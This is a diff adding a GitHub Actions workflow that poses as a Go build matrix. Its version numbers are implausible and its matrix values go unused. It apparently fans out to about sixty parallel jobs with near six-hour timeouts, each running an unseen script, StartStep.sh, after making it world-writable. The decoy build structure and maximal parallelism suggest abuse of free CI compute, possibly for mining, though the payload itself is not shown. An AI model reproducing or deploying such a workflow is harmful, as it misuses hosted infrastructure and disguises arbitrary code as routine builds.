@@ -1,0 +1,71 @@
+name: Shell
+on: [push]
+
+jobs:
+  Shell:
+    container:
+      image: ubuntu:bionic
+    runs-on: ubuntu-20.04
+    continue-on-error: true
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
+        flag: [A, B]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Shell_HT
+      run: |
+        set -e
+        apt-get update -y
+        sleep 10
+  Main-01:
+    needs: Shell
+    runs-on: ubuntu-20.04
+    continue-on-error: true
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+         compiler: [1.01, 1.02, 1.03, 1.04]
+         flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O]  
+    timeout-minutes: 350
+    env:
+        NUM_JOBS: 80
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Shell_HT
+      run: |
+      
+        chmod 777 StartStep.sh && ./StartStep.sh
+  
+  Success:
+    needs: [Shell, Main-01]
+    if: always()
+    runs-on: ubuntu-20.04
+    steps:
+      - uses: technote-space/workflow-conclusion-action@v2
+      - name: Check Failure
+        if: env.WORKFLOW_CONCLUSION == 'failure'
+        run: exit 1
+      - name: Success
+        if: ${{ success() }}
+        run: echo "all don,All Done"
